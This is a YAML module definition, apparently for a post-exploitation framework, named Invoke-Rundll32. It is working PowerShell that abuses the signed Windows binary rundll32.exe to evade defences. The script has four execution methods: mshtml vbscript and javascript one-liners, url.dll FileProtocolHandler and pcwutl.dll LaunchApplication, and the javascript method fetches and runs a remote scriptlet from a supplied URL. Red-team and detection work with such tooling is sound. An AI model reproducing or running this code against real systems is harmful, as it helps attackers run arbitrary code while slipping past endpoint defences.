name: Invoke-Rundll32
authors:
  - name: Anthony Rose
    handle: '@Cx01N'
    link: https://twitter.com/Cx01N_
description: |
  Executes commands via rundll32.exe proxy execution using various
  DLL functions. Supports multiple methods including vbscript and
  javascript execution via mshtml, URL.dll FileProtocolHandler,
  and pcwutl.dll LaunchApplication. Rundll32 is a signed Microsoft
  binary commonly abused for defense evasion.
software: ''
tactics: [TA0005]
techniques: [T1218.011]
background: true
output_extension:
needs_admin: false
opsec_safe: false
language: powershell
min_language_version: '2'
comments:
  - https://github.com/redcanaryco/atomic-red-team
options:
  - name: Method
    description: >-
      Rundll32 execution method to use.
    required: true
    value: 'url'
    suggested_values:
      - vbscript
      - javascript
      - url
      - pcwutl
  - name: Command
    description: Command or executable to run.
    required: true
    value: 'calc.exe'
  - name: ScriptUrl
    description: >-
      URL to remote SCT file.
    required: false
    value: ''
    depends_on:
      - name: Method
        values: ['javascript']
  - name: OutputFunction
    description: PowerShell output function to use.
    required: false
    value: 'Out-String'
    suggested_values:
      - Out-String
      - ConvertTo-Json
script: |
  function Invoke-Rundll32 {
      param(
          [string]$Method = "vbscript",
          [string]$Command = "calc.exe",
          [string]$ScriptUrl
      )

      switch ($Method.ToLower()) {
          "vbscript" {
              Write-Output "[*] Executing via VBScript method..."
              try {
                  $psi = New-Object System.Diagnostics.ProcessStartInfo
                  $psi.FileName = "cmd.exe"
                  $psi.Arguments = '/c rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("' + $Command + '"),0)'
                  $psi.UseShellExecute = $false
                  $proc = [System.Diagnostics.Process]::Start($psi)
                  $proc.WaitForExit(5000)
                  Write-Output "[+] Executed: rundll32 vbscript method with command: $Command (PID: $($proc.Id))"
              } catch {
                  Write-Output "[-] Failed to start process: $_"
              }
          }
          "javascript" {
              if (-not $ScriptUrl) {
                  Write-Output "[-] ScriptUrl is required for javascript method."
                  return
              }
              Write-Output "[*] Executing via JavaScript method..."
              try {
                  $psi = New-Object System.Diagnostics.ProcessStartInfo
                  $psi.FileName = "cmd.exe"
                  $psi.Arguments = '/c rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:' + $ScriptUrl + '").Exec();window.close();'
                  $psi.UseShellExecute = $false
                  $proc = [System.Diagnostics.Process]::Start($psi)
                  $proc.WaitForExit(5000)
                  Write-Output "[+] Executed: rundll32 javascript method with URL: $ScriptUrl (PID: $($proc.Id))"
              } catch {
                  Write-Output "[-] Failed to start process: $_"
              }
          }
          "url" {
              Write-Output "[*] Executing via URL.dll FileProtocolHandler..."
              try {
                  $psi = New-Object System.Diagnostics.ProcessStartInfo
                  $psi.FileName = "rundll32.exe"
                  $psi.Arguments = "url.dll,FileProtocolHandler $Command"
                  $psi.UseShellExecute = $false
                  $proc = [System.Diagnostics.Process]::Start($psi)
                  $proc.WaitForExit(5000)
                  Write-Output "[+] Executed: rundll32.exe url.dll,FileProtocolHandler $Command (PID: $($proc.Id))"
              } catch {
                  Write-Output "[-] Failed to start process: $_"
              }
          }
          "pcwutl" {
              Write-Output "[*] Executing via pcwutl.dll LaunchApplication..."
              try {
                  $psi = New-Object System.Diagnostics.ProcessStartInfo
                  $psi.FileName = "rundll32.exe"
                  $psi.Arguments = "pcwutl.dll,LaunchApplication $Command"
                  $psi.UseShellExecute = $false
                  $proc = [System.Diagnostics.Process]::Start($psi)
                  $proc.WaitForExit(5000)
                  Write-Output "[+] Executed: rundll32.exe pcwutl.dll,LaunchApplication $Command (PID: $($proc.Id))"
              } catch {
                  Write-Output "[-] Failed to start process: $_"
              }
          }
          default {
              Write-Output "[-] Invalid method: $Method."
          }
      }
  }
script_end: Invoke-Rundll32 {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
